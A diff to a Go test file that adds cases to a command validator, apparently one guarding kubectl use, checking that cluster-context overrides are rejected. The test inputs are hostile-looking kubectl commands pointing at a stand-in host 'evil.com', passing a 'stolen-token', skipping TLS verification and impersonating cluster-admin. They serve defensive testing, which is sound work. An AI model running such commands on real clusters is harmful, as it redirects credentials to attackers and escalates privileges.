@@ -550,6 +550,31 @@ func TestValidateMixedModeCommands(t *testing.T) {
 			wantReason: "cluster context overrides are blocked",
 		},
 		{
+			name:       "reject --server transport flag",
+			command:    "kubectl get pods --server=https://evil.com",
+			wantReason: "cluster context overrides are blocked",
+		},
+		{
+			name:       "reject --token auth flag",
+			command:    "kubectl get pods --token=stolen-token",
+			wantReason: "cluster context overrides are blocked",
+		},
+		{
+			name:       "reject --insecure-skip-tls-verify",
+			command:    "kubectl get pods --insecure-skip-tls-verify",
+			wantReason: "cluster context overrides are blocked",
+		},
+		{
+			name:       "reject -s short server flag",
+			command:    "kubectl get pods -s https://evil.com",
+			wantReason: "cluster context overrides are blocked",
+		},
+		{
+			name:       "reject --as impersonation",
+			command:    "kubectl get pods --as=cluster-admin",
+			wantReason: "cluster context overrides are blocked",
+		},
+		{
 			name:              "require approval for helm install",
 			command:           "helm install demo chart/demo",
 			wantApprovalBlock: true,
